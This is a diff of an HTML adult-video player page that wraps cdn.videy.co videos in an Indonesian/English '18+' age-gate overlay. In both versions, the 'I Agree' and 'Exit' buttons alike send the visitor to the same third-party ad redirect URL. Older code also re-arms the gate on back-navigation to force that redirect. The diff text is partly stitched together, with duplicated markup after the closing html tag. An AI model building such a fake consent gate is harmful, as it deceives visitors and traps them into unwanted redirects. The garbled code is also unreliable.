@@ -1,163 +1,137 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Watch</title>
 
 <style>
 html,body{
-  margin:0; padding:0; width:100%; height:100%;
-  background:#000; overflow:hidden; font-family:Arial,sans-serif;
+  margin:0;
+  padding:0;
+  width:100%;
+  height:100%;
+  background:#000;
+  overflow:hidden;
 }
-.player-container{
-  position:fixed; inset:0; width:100vw; height:100vh; background:#000;
+
+/* VIDEO FULL */
+video{
+  position:fixed;
+  top:0;left:0;
+  width:100%;
+  height:100%;
+  object-fit:cover;
+  background:#000;
 }
-video,iframe{
-  width:100%; height:100%; object-fit:contain; background:#000; border:none;
+
+/* GATE OVERLAY */
+#gate{
+  position:fixed;
+  inset:0;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  background:rgba(0,0,0,.35); /* transparan */
+  backdrop-filter: blur(2px);
+  z-index:999;
 }
-.gate{
-  position:fixed; inset:0; background:rgba(0,0,0,.92);
-  display:flex; align-items:center; justify-content:center; z-index:9999;
-}
+
+/* BOX GATE */
 .gate-box{
-  text-align:center; color:#fff; max-width:320px; padding:20px;
+  width:85%;
+  max-width:360px;
+  background:rgba(0,0,0,.75);
+  border-radius:14px;
+  padding:20px;
+  color:#fff;
+  text-align:center;
+  box-shadow:0 10px 40px rgba(0,0,0,.6);
 }
-.gate-box h2{ font-size:22px; margin-bottom:8px; }
-.gate-box p{ font-size:14px; opacity:.85; }
-.gate-btn{
-  display:block; margin-top:14px; padding:14px; border-radius:6px;
-  font-weight:bold; text-decoration:none;
+
+.gate-box h2{
+  font-size:20px;
+  margin:0 0 8px;
 }
-.agree{ background:#1e90ff; color:#fff; }
-.exit{ background:#444; color:#fff; }
+
+.gate-box p{
+  font-size:14px;
+  opacity:.85;
+  margin-bottom:18px;
+}
+
+.btn{
+  display:block;
+  width:100%;
+  padding:12px;
+  border-radius:8px;
+  font-size:16px;
+  border:none;
+  margin-bottom:10px;
+}
+
+.btn-yes{
+  background:#1e88ff;
+  color:#fff;
+}
+
+.btn-no{
+  background:#444;
+  color:#fff;
+}
 </style>
 </head>
 
 <body>
 
-<div class="player-container" id="wrap">
-  <video id="player" controls playsinline></video>
-</div>
+<video id="video" playsinline preload="metadata"></video>
 
-<div class="gate" id="gate">
+<div id="gate">
   <div class="gate-box">
-    <h2 id="gTitle">🔞 Apakah Anda sudah 18+?</h2>
-    <p id="gDesc">Konten ini hanya untuk pengguna dewasa</p>
-    <a href="#" class="gate-btn agree" id="agree">Saya Setuju</a>
-    <a href="#" class="gate-btn exit" id="exit">Keluar</a>
+    <h2 id="title">Apakah Anda sudah 18+?</h2>
+    <p id="desc">Konten ini hanya untuk pengguna dewasa</p>
+    <button class="btn btn-yes" id="agree">Saya Setuju</button>
+    <button class="btn btn-no" id="exit">Keluar</button>
   </div>
 </div>
 
 <script>
 (function(){
-  // ===== KONFIG =====
-  const REDIRECT = "https://biteanxiously.com/mw1hyfqyv?key=09409c2256c55cc0edbdfd9a8c3e242c";
-
-  // ===== AUTO BAHASA (ID / EN) =====
-  const lang = (navigator.language || "en").toLowerCase();
-  if(!lang.startsWith("id")){
-    document.getElementById("gTitle").innerText = "🔞 Are you 18 years old?";
-    document.getElementById("gDesc").innerText  = "This content is for adults only";
-    document.getElementById("agree").innerText  = "I Agree";
-    document.getElementById("exit").innerText   = "Exit";
-  }
-
-  // ===== AMBIL ID VIDEO =====
-  const qs = new URLSearchParams(location.search);
-  let id = qs.get("id");
-
-  const player = document.getElementById("player");
-  const wrap   = document.getElementById("wrap");
-  const gate   = document.getElementById("gate");
-  const agree  = document.getElementById("agree");
-  const exit   = document.getElementById("exit");
-
-  if(!id){
-    wrap.innerHTML = "<h2 style='color:#fff;text-align:center'>No video ID</h2>";
-    return;
-  }
+  const params = new URLSearchParams(location.search);
+  let id = params.get("id");
+  if(!id) return;
 
   if(!id.endsWith(".mp4")) id += ".mp4";
-  const videoURL = "https://cdn.videy.co/" + id;
-  player.src = videoURL;
+  const videoUrl = "https://cdn.videy.co/" + id;
+  const video = document.getElementById("video");
+  const gate = document.getElementById("gate");
 
-  player.onerror = () => {
-    wrap.innerHTML = `<iframe src="${videoURL}" allowfullscreen></iframe>`;
-  };
+  video.src = videoUrl;
 
-  // ===== DEFAULT: TAMPILKAN GATE =====
-  function showGate(){ gate.style.display="flex"; player.pause(); }
-  function hideGatePlay(){
-    gate.style.display="none";
-    setTimeout(()=>player.play().catch(()=>{}),300);
-  }
-  showGate();
-
-  // ===== KLIK TOMBOL =====
-  agree.onclick = e => { e.preventDefault(); location.href = REDIRECT; };
-  exit.onclick  = e => { e.preventDefault(); location.href = REDIRECT; };
-
-  // 🔥 KUNCI ANTI-BANDEL (BACK dari cache)
-  window.addEventListener("pageshow", function(ev){
-    // Kalau balik dari halaman lain (BACK / bfcache)
-    if (ev.persisted || performance.getEntriesByType("navigation")[0]?.type === "back_forward") {
-      hideGatePlay();
-    }
-  });
-})();
-</script>
-
-</body>
-</html>    <a href="#" class="gate-btn agree" id="agree">Saya Setuju</a>
-    <a href="#" class="gate-btn exit" id="exit">Keluar</a>
-  </div>
-</div>
-
-<script>
-(function(){
   const REDIRECT = "https://biteanxiously.com/mw1hyfqyv?key=09409c2256c55cc0edbdfd9a8c3e242c";
-  const qs = new URLSearchParams(location.search);
+  const KEY = "gate_" + id;
 
-  let id = qs.get("id");
-  const ok = qs.get("ok"); // 🔑 FLAG
-
-  const player = document.getElementById("player");
-  const wrap   = document.getElementById("wrap");
-  const gate   = document.getElementById("gate");
-
-  if(!id){
-    wrap.innerHTML="<h2 style='color:#fff;text-align:center'>No video</h2>";
-    return;
+  /* AUTO BAHASA */
+  if(!navigator.language.toLowerCase().startsWith("id")){
+    document.getElementById("title").innerText = "Are you 18+?";
+    document.getElementById("desc").innerText = "This content is for adults only";
+    document.getElementById("agree").innerText = "I Agree";
+    document.getElementById("exit").innerText = "Exit";
   }
 
-  if(!id.endsWith(".mp4")) id += ".mp4";
-  const videoURL = "https://cdn.videy.co/" + id;
-  player.src = videoURL;
-
-  player.onerror = () => {
-    wrap.innerHTML = `<iframe src="${videoURL}" allowfullscreen></iframe>`;
-  };
-
-  // ✅ JIKA BALIK DARI REDIRECT
-  if(ok === "1"){
+  /* JIKA SUDAH PERNAH SETUJU */
+  if(sessionStorage.getItem(KEY)){
     gate.style.display = "none";
-    history.replaceState({}, "", location.pathname + "?id=" + id);
-    setTimeout(()=>player.play().catch(()=>{}),300);
-  }else{
-    gate.style.display = "flex";
-    player.pause();
+    video.play().catch(()=>{});
   }
 
-  document.getElementById("agree").onclick = e => {
-    e.preventDefault();
+  function proceed(){
+    sessionStorage.setItem(KEY,"1");
     location.href = REDIRECT;
-  };
+  }
 
-  document.getElementById("exit").onclick = e => {
-    e.preventDefault();
-    location.href = REDIRECT;
-  };
+  document.getElementById("agree").onclick = proceed;
+  document.getElementById("exit").onclick = proceed;
 
 })();
 </script>
